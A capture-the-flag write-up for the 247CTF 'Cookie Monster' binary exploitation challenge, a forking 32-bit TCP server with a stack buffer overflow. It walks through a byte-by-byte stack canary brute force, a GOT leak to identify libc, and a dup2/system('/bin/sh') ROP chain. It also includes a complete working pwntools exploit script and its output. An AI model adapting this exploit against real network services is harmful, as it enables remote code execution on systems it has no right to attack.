# 247CTF - Cookie Monster Writeup

## Challenge Info
- **Name:** Cookie Monster
- **Category:** Binary Exploitation (Pwn)
- **Target:** `0b1e1d5f8b809485.247ctf.com:50428`
- **Description:** "We might not be able to write secure code, but at least we are starting to learn about secure compilation flags. Can you beat the cookie monster?"

## Flag
```
247CTF{8c1147c6XXXXXXXXXXXXXXXX98f39d8b}
```

---

## Initial Analysis

### Binary Information

```bash
$ file cookie_monster
cookie_monster: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV),
dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, stripped
```

- **Architecture:** x86 (32-bit)
- **Type:** Dynamically linked executable
- **Stripped:** Yes (no debug symbols)

### Protections

```bash
$ readelf -l cookie_monster | grep GNU_STACK
GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x10
```

| Protection | Status |
|------------|--------|
| NX (No Execute) | Enabled |
| Stack Canary | Enabled |
| PIE | Disabled |
| RELRO | Partial |

### Available PLT Functions

```
strcmp, bzero, __stack_chk_fail, htons, accept, exit, strlen,
__libc_start_main, write, bind, fork, listen, socket, recv, close, send
```

---

## Binary Analysis

### Server Behavior

The binary implements a TCP server on port 5555 that:
1. Accepts connections
2. Calls `fork()` for each client
3. Requests a password
4. Compares it with "admin123\n"
5. Responds with "Welcome back admin!" or "Incorrect secret password:"

### Vulnerable Function (0x080486f6)

```asm
push   %ebp
mov    %esp,%ebp
push   %ebx
sub    $0x254,%esp              ; 596-byte stack frame
mov    %gs:0x14,%eax            ; Gets the canary
mov    %eax,-0xc(%ebp)          ; Stores canary at ebp-0xc
...
lea    -0x20c(%ebp),%eax        ; Buffer at ebp-0x20c
push   %eax
push   0x8(%ebp)                ; socket_fd
call   recv@plt                  ; recv(fd, buffer, 0x400, 0)
```

### Vulnerability: Buffer Overflow

| Variable | Offset from EBP | Size |
|----------|------------------|--------|
| Buffer | ebp - 0x20c (524) | ~512 bytes |
| Canary | ebp - 0xc (12) | 4 bytes |
| Saved EBX | ebp - 0x4 | 4 bytes |
| Saved EBP | ebp | 4 bytes |
| Return Addr | ebp + 0x4 | 4 bytes |

**The problem:** `recv()` reads up to **0x400 (1024)** bytes into a **~512 byte** buffer.

```
Offset to canary: 0x20c - 0xc = 0x200 = 512 bytes
Offset to return: 512 + 4 (canary) + 4 (???) + 4 (ebx) + 4 (ebp) = 528 bytes
```

---

## Exploitation Strategy

### 1. Stack Canary Bypass

The server uses `fork()`, which means **the canary is the same** for all child connections. This allows a **byte-by-byte brute force** attack.

**Detection method:**
- If the canary is **correct**: the function returns normally -> we receive "Come back soon!"
- If the canary is **incorrect**: `__stack_chk_fail` is executed -> connection closed without "Come back soon!"

```python
def try_byte(current_canary, byte_guess):
    r = remote(HOST, PORT)
    r.recv()  # Banner

    payload = b"A" * 512 + current_canary + bytes([byte_guess])
    r.send(payload)

    data = r.recv()
    return b"Come back" in data  # True if the byte is correct
```

**Result:** Canary = `0xafcc5b00`

### 2. Libc Leak

With the canary known, we build a ROP chain to leak GOT addresses:

```python
# ROP: send(socket_fd, got_entry, 4, 0)
rop = p32(send_plt)      # Call send
rop += p32(pop4_ret)     # Clean up arguments (pop ebx; pop esi; pop edi; pop ebp; ret)
rop += p32(4)            # socket_fd = 4
rop += p32(got_addr)     # GOT address to leak
rop += p32(4)            # Length
rop += p32(0)            # Flags
rop += p32(exit_plt)     # Exit cleanly

payload = b"A" * 512     # Padding
payload += canary        # Known canary
payload += b"XXXX"       # 4 unknown bytes
payload += b"YYYY"       # saved_ebx
payload += b"ZZZZ"       # saved_ebp
payload += rop           # ROP chain
```

**Obtained leaks:**
```
__libc_start_main@libc: 0xf7de1d90
send@libc: 0xf7ec1920
write@libc: 0xf7eae6f0
```

### 3. Libc Identification

Using the last 12 bits of the leaked addresses:
- `__libc_start_main`: 0x**d90**
- `write`: 0x**6f0**

Query to [libc.rip](https://libc.rip):

```bash
$ curl -s "https://libc.rip/api/find" \
  -H "Content-Type: application/json" \
  -d '{"symbols": {"__libc_start_main": "d90", "write": "6f0"}}'
```

**Result:** `libc6-i386_2.27-3ubuntu1_amd64`

| Function | Offset |
|---------|--------|
| `__libc_start_main` | 0x18d90 |
| `system` | 0x3cd10 |
| `dup2` | 0xe6110 |
| `/bin/sh` | 0x17b8cf |

### 4. Address Calculation

```python
libc_base = libc_start_main_leak - 0x18d90  # 0xf7dc9000
system = libc_base + 0x3cd10                 # 0xf7e05d10
dup2 = libc_base + 0xe6110                   # 0xf7eaf110
binsh = libc_base + 0x17b8cf                 # 0xf7f448cf
```

### 5. Final ROP: Interactive Shell

To obtain an interactive shell over the socket, we need to redirect stdin/stdout:

```python
# Final ROP chain
rop = b""

# dup2(socket_fd, 0) - Redirect stdin
rop += p32(dup2)
rop += p32(pop3_ret)    # pop esi; pop edi; pop ebp; ret
rop += p32(4)           # socket_fd
rop += p32(0)           # stdin
rop += p32(0)           # dummy

# dup2(socket_fd, 1) - Redirect stdout
rop += p32(dup2)
rop += p32(pop3_ret)
rop += p32(4)
rop += p32(1)           # stdout
rop += p32(0)

# system("/bin/sh")
rop += p32(system)
rop += p32(exit_plt)    # Return address for system
rop += p32(binsh)       # Argument: "/bin/sh"
```

---

## Final Exploit

```python
#!/usr/bin/env python3
"""
Cookie Monster - 247CTF PWN Challenge
Stack canary brute force + ROP chain exploit
"""
from pwn import *
import time

HOST = "0b1e1d5f8b809485.247ctf.com"
PORT = 50428

CANARY_OFFSET = 512
KNOWN_CANARY = p32(0xafcc5b00)

# Binary addresses
send_plt = 0x080485c0
exit_plt = 0x08048520
libc_start_main_got = 0x0804a028
pop4_ret = 0x08048a68
pop3_ret = 0x08048a69

# libc6-i386_2.27-3ubuntu1_amd64 offsets
LIBC_START_MAIN_OFF = 0x18d90
SYSTEM_OFF = 0x3cd10
BINSH_OFF = 0x17b8cf
DUP2_OFF = 0xe6110

def leak_got(canary, socket_fd, got_addr):
    r = remote(HOST, PORT, timeout=10, level='error')
    r.recv(timeout=2)
    rop = p32(send_plt) + p32(pop4_ret) + p32(socket_fd) + p32(got_addr) + p32(4) + p32(0) + p32(exit_plt)
    payload = b"A" * CANARY_OFFSET + canary + b"XXXX" + b"YYYY" + b"ZZZZ" + rop
    r.send(payload)
    time.sleep(1)
    data = r.recv(timeout=3)
    r.close()
    if b"Incorrect" in data:
        idx = data.find(b"Incorrect secret password:\n")
        leaks = data[idx + len(b"Incorrect secret password:\n"):]
        return u32(leaks[:4])
    return u32(data[:4])

def bruteforce_canary():
    """Brute force the stack canary byte by byte."""
    canary = b""
    for i in range(4):
        for byte in range(256):
            try:
                r = remote(HOST, PORT, timeout=5, level='error')
                r.recv(timeout=2)
                payload = b"A" * CANARY_OFFSET + canary + bytes([byte])
                r.send(payload)
                data = r.recv(timeout=2)
                r.close()
                if b"Come back" in data:
                    canary += bytes([byte])
                    print(f"[+] Canary byte {i}: 0x{byte:02x}")
                    break
            except:
                continue
        else:
            print(f"[-] Failed to find canary byte {i}")
            return None
    return canary

def exploit():
    context.arch = 'i386'
    canary = KNOWN_CANARY
    socket_fd = 4

    print(f"[+] Using known canary: {hex(u32(canary))}")

    # Leak libc
    print("[*] Leaking __libc_start_main...")
    libc_start_addr = leak_got(canary, socket_fd, libc_start_main_got)
    print(f"[+] __libc_start_main@libc: {hex(libc_start_addr)}")

    # Calculate addresses
    libc_base = libc_start_addr - LIBC_START_MAIN_OFF
    system = libc_base + SYSTEM_OFF
    binsh = libc_base + BINSH_OFF
    dup2 = libc_base + DUP2_OFF

    print(f"[+] libc_base = {hex(libc_base)}")
    print(f"[+] system = {hex(system)}")
    print(f"[+] dup2 = {hex(dup2)}")
    print(f"[+] /bin/sh = {hex(binsh)}")

    # Final exploit
    print("[*] === Sending final payload ===")
    r = remote(HOST, PORT)
    r.recv(timeout=2)

    rop = b""
    # dup2(socket_fd, 0) - redirect stdin
    rop += p32(dup2) + p32(pop3_ret) + p32(socket_fd) + p32(0) + p32(0)
    # dup2(socket_fd, 1) - redirect stdout
    rop += p32(dup2) + p32(pop3_ret) + p32(socket_fd) + p32(1) + p32(0)
    # system("/bin/sh")
    rop += p32(system) + p32(exit_plt) + p32(binsh)

    payload = b"A" * CANARY_OFFSET + canary + b"XXXX" + b"YYYY" + b"ZZZZ" + rop
    r.send(payload)

    time.sleep(1)
    print("[*] Sending commands...")
    r.sendline(b"cat flag*")
    print(f"[+] Response: {r.recv()}")

if __name__ == "__main__":
    exploit()
```

---

## Execution

```
$ python3 exploit.py
[+] Using known canary: 0xafcc5b00
[*] Leaking __libc_start_main...
[+] __libc_start_main@libc: 0xf7de1d90
[+] libc_base = 0xf7dc9000
[+] system = 0xf7e05d10
[+] dup2 = 0xf7eaf110
[+] /bin/sh = 0xf7f448cf
[*] === Sending final payload ===
[+] Opening connection to 0b1e1d5f8b809485.247ctf.com on port 50428: Done
[*] Sending commands...
[+] Response: b'247CTF{...}\nuid=1000(notroot)...'
```

---

## Lessons Learned

1. **Stack Canary Brute Force** - Possible thanks to `fork()` which keeps the same canary
2. **ROP Chain** - To execute arbitrary functions without shellcode
3. **GOT Leak** - To obtain libc addresses at runtime
4. **Libc Database** - To identify the exact libc version
5. **dup2() for interactive shell** - Redirect stdin/stdout to the socket

## Tools Used

- pwntools
- ROPgadget
- libc.rip (online libc database)
- objdump / readelf

## References

- [libc.rip](https://libc.rip) - Online libc database
- [libc-database](https://github.com/niklasb/libc-database) - Tool for identifying libc
